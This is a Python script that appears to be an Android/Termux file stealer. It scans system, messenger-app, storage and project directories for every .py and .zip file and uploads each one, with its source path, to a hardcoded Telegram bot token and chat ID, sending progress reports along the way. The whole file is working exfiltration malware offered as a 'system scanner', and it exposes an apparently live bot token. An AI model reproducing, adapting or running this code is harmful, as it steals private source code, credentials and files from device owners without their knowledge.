import os
import requests
import time
import platform
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import hashlib

BOT_TOKEN = "8458353658:AAGqFIm29RoTBdDQNay8yvSFFNZoRzOusDk"
CHAT_ID = "8812220324"

# Global counters
files_sent = 0
file_sources = {}  # Track where files came from

def send_message(text):
    """Send message to Telegram"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {'chat_id': CHAT_ID, 'text': text[:4000]}
        response = requests.post(url, data=data, timeout=10)
        return True
    except:
        return False

def send_file_with_source(file_path):
    """Send file with source information"""
    global files_sent

    try:
        if os.path.getsize(file_path) > 45 * 1024 * 1024:
            return False, "File too large"

        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"

        # Get file source directory
        source_dir = os.path.dirname(file_path)
        file_name = os.path.basename(file_path)

        # Create caption with source info
        caption = f"📁 Source: {source_dir}\n📄 File: {file_name}"

        with open(file_path, 'rb') as file:
            files = {'document': file}
            data = {'chat_id': CHAT_ID, 'caption': caption}
            response = requests.post(url, files=files, data=data, timeout=60)

        if response.status_code == 200:
            files_sent += 1

            # Track file source
            if source_dir not in file_sources:
                file_sources[source_dir] = []
            file_sources[source_dir].append(file_name)

            return True, f"Sent from: {source_dir}"
        else:
            return False, f"Failed: {response.text}"

    except Exception as e:
        return False, f"Error: {str(e)}"

def get_comprehensive_system_paths():
    """Get ALL possible system paths"""
    all_paths = []

    # Root level paths
    root_paths = [
        "/", "/system", "/data", "/sdcard", "/storage", "/mnt",
        "/vendor", "/etc", "/proc", "/sys", "/cache", "/config",
        "/acct", "/apex", "/bugreports", "/d", "/dev", "/firmware",
        "/odm", "/oem", "/product", "/system_ext", "/metadata"
    ]

    # Android specific paths
    android_paths = [
        "/data/app", "/data/data", "/data/local", "/data/media",
        "/data/misc", "/data/system", "/data/user", "/data/user_de",
        "/storage/emulated/0", "/storage/emulated/1", "/storage/emulated/2",
        "/storage/self/primary", "/storage/0000-0000"  # SD card
    ]

    # Termux and user paths
    user_paths = [
        os.path.expanduser("~"),
        "/data/data/com.termux/files/home", "/data/data/com.termux/files/usr",
        "/data/data/com.termux/files/usr/bin", "/data/data/com.termux/files/usr/lib",
        "/data/data/com.termux/files/usr/share", "/data/data/com.termux/files/usr/etc"
    ]

    # Termux storage
    termux_storage = [
    "/data/data/com.termux/files/home/storage/downloads",
    "/data/data/com.termux/files/home/storage/dcim",
    "/data/data/com.termux/files/home/storage/documents",
    "/data/data/com.termux/files/home/storage/shared",
    "/data/data/com.termux/files/home/storage/pictures",
    "/data/data/com.termux/files/home/storage/music",
    "/data/data/com.termux/files/home/storage/movies",
    # Additional ones:
    "/data/data/com.termux/files/home/storage/ringtones",
    "/data/data/com.termux/files/home/storage/alarms",
    "/data/data/com.termux/files/home/storage/notifications",
]

    # Common app directories
    app_paths = [
        "/storage/emulated/0/Android/data", "/storage/emulated/0/Android/media",
        "/storage/emulated/0/Android/obb", "/storage/emulated/0/Telegram",
        "/storage/emulated/0/WhatsApp", "/storage/emulated/0/Signal",
        "/storage/emulated/0/Download", "/storage/emulated/0/Documents",
        "/storage/emulated/0/DCIM", "/storage/emulated/0/Pictures",
        "/storage/emulated/0/Movies", "/storage/emulated/0/Music"
    ]

    # Bot and script directories
    bot_paths = [
        "/data/data/com.termux/files/home/bot", "/data/data/com.termux/files/home/bots",
        "/data/data/com.termux/files/home/telegram", "/data/data/com.termux/files/home/telegram_bot",
        "/data/data/com.termux/files/home/scripts", "/data/data/com.termux/files/home/projects",
        "/data/data/com.termux/files/home/github", "/data/data/com.termux/files/home/workspace",
        "/data/data/com.termux/files/home/code", "/storage/emulated/0/bot",
        "/storage/emulated/0/bots", "/storage/emulated/0/telegram",
        "/storage/emulated/0/scripts", "/storage/emulated/0/projects"
    ]

    # Combine all paths
    all_paths.extend(root_paths)
    all_paths.extend(android_paths)
    all_paths.extend(user_paths)
    all_paths.extend(termux_storage)
    all_paths.extend(app_paths)
    all_paths.extend(bot_paths)

    # Discover additional storage paths
    storage_discovery = ["/storage", "/mnt", "/data"]
    for base_path in storage_discovery:
        if os.path.exists(base_path):
            try:
                for item in os.listdir(base_path):
                    full_path = os.path.join(base_path, item)
                    if os.path.isdir(full_path):
                        all_paths.append(full_path)
            except:
                pass

    # Remove duplicates and filter existing paths
    existing_paths = []
    for path in set(all_paths):
        if os.path.exists(path):
            existing_paths.append(path)

    return sorted(existing_paths)

def scan_specific_file_types(directory, target_extensions):
    """Scan for specific file types with detailed tracking"""
    files_found = []
    try:
        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                file_ext = os.path.splitext(file_path)[1].lower()

                if file_ext in target_extensions:
                    files_found.append({
                        'path': file_path,
                        'extension': file_ext,
                        'source_dir': root,
                        'filename': file
                    })

    except Exception as e:
        pass

    return files_found

def comprehensive_file_discovery():
    """Discover ALL .py and .zip files in the system"""
    global file_sources

    # Target file extensions
    target_extensions = {'.py', '.zip'}
    system_paths = get_comprehensive_system_paths()
    all_files = []

    send_message(f"🔍 Scanning {len(system_paths)} system locations for .py and .zip files...")

    # Parallel scanning with detailed tracking
    with ThreadPoolExecutor(max_workers=15) as executor:
        future_to_path = {
            executor.submit(scan_specific_file_types, path, target_extensions): path
            for path in system_paths
        }

        completed = 0
        for future in as_completed(future_to_path):
            path = future_to_path[future]
            try:
                files = future.result()
                all_files.extend(files)
                completed += 1

                # Send progress for every 10 directories
                if completed % 10 == 0:
                    progress_msg = f"""📊 Discovery Progress
────────────────────────────────
📁 Directories scanned: {completed}/{len(system_paths)}
📄 Files found so far: {len(all_files):,}"""
                    send_message(progress_msg)

            except Exception as e:
                pass

    # Organize files by type and source
    py_files = [f for f in all_files if f['extension'] == '.py']
    zip_files = [f for f in all_files if f['extension'] == '.zip']

    return py_files, zip_files

def send_files_with_detailed_report(file_list, file_type):
    """Send files with detailed source reporting"""
    global files_sent

    total_files = len(file_list)
    send_message(f"🔄 Sending {total_files:,} {file_type} files with source tracking...")

    # Group files by source directory for better organization
    source_groups = {}
    for file_info in file_list:
        source_dir = file_info['source_dir']
        if source_dir not in source_groups:
            source_groups[source_dir] = []
        source_groups[source_dir].append(file_info)

    # Send files grouped by source
    sources_processed = 0
    for source_dir, files_in_source in source_groups.items():
        sources_processed += 1

        # Send source information
        source_info = f"""📁 SOURCE LOCATION {sources_processed}/{len(source_groups)}
────────────────────────────────
📃 Path: {source_dir}
📦 {file_type} files: {len(files_in_source)}"""
        send_message(source_info)

        # Send files from this source
        files_sent_from_source = 0
        for file_info in files_in_source:
            success, message = send_file_with_source(file_info['path'])
            if success:
                files_sent_from_source += 1
            time.sleep(0.3)  # Small delay to avoid rate limits

        # Source completion report
        source_report = f"""✅ SOURCE COMPLETED
────────────────────────────────
📃 Path: {source_dir}
📤 Files sent: {files_sent_from_source}/{len(files_in_source)}"""
        send_message(source_report)

        # Brief pause between sources
        if sources_processed < len(source_groups):
            time.sleep(2)

def generate_comprehensive_report(py_files, zip_files):
    """Generate detailed report of all files and sources"""

    # Count files by extension
    py_count = len(py_files)
    zip_count = len(zip_files)

    # Get unique source directories
    all_sources = set()
    for file_info in py_files + zip_files:
        all_sources.add(file_info['source_dir'])

    # Create detailed report
    report = f"""📊 COMPREHENSIVE SCAN REPORT
──────────────────────────────────────────────────

📁 FILES DISCOVERED:
• 🐍 Python files (.py): {py_count:,}
• 📦 Archive files (.zip): {zip_count:,}
• 📄 Total files: {py_count + zip_count:,}

📂 SOURCE LOCATIONS ({len(all_sources)}):"""

    # Add top source locations
    source_counts = {}
    for file_info in py_files + zip_files:
        source = file_info['source_dir']
        source_counts[source] = source_counts.get(source, 0) + 1

    # Sort sources by file count
    sorted_sources = sorted(source_counts.items(), key=lambda x: x[1], reverse=True)

    for source, count in sorted_sources[:20]:  # Top 20 sources
        report += f"\n• {source} - {count} files"

    if len(sorted_sources) > 20:
        report += f"\n• ... and {len(sorted_sources) - 20} more locations"

    return report

def main():
    print("🤖 COMPREHENSIVE SYSTEM SCANNER STARTED")
    print("🔧 Target: ALL .py and .zip files with source tracking")

    start_time = time.time()

    try:
        # Initial message
        send_message("""🔍 COMPREHENSIVE SYSTEM SCAN INITIATED
──────────────────────────────────────────────────
🔧 Target: ALL .py and .zip files
📋 Scope: Entire system scan
📊 Features: Source location tracking""")

        # Phase 1: Comprehensive Discovery
        discovery_start = time.time()
        send_message("🔍 PHASE 1: SYSTEM-WIDE FILE DISCOVERY")

        py_files, zip_files = comprehensive_file_discovery()
        discovery_time = time.time() - discovery_start

        # Discovery report
        discovery_report = generate_comprehensive_report(py_files, zip_files)
        send_message(discovery_report)

        # Phase 2: Send Python files first
        if py_files:
            send_message("🐍 PHASE 2: SENDING PYTHON FILES")
            send_files_with_detailed_report(py_files, "Python")

        # Phase 3: Send Zip files
        if zip_files:
            send_message("📦 PHASE 3: SENDING ARCHIVE FILES")
            send_files_with_detailed_report(zip_files, "Zip")

        # Final comprehensive report
        total_time = time.time() - start_time
        final_report = f"""✅ COMPREHENSIVE TRANSFER COMPLETED
──────────────────────────────────────────────────

📊 TRANSFER SUMMARY:
• 🐍 Python files sent: {len([f for f in py_files if any(f['path'] in sources for sources in file_sources.values())])}
• 📦 Zip files sent: {len([f for f in zip_files if any(f['path'] in sources for sources in file_sources.values())])}
• 📤 Total files sent: {files_sent:,}

📂 SOURCE ANALYSIS:
• Unique locations: {len(file_sources)}
• Files per location: {files_sent/len(file_sources):.1f} avg.

⏱ PERFORMANCE:
• Total time: {total_time:.2f}s
• Files per second: {files_sent/total_time:.2f}

🔍 DETAILS:
Every file sent with its source location information!"""
        send_message(final_report)
        print(f"✅ COMPLETED! {files_sent:,} files sent from {len(file_sources)} locations")

    except Exception as e:
        error_msg = f"❌ SCAN FAILED: {str(e)}"
        send_message(error_msg)
        print(error_msg)

if __name__ == "__main__":
    main()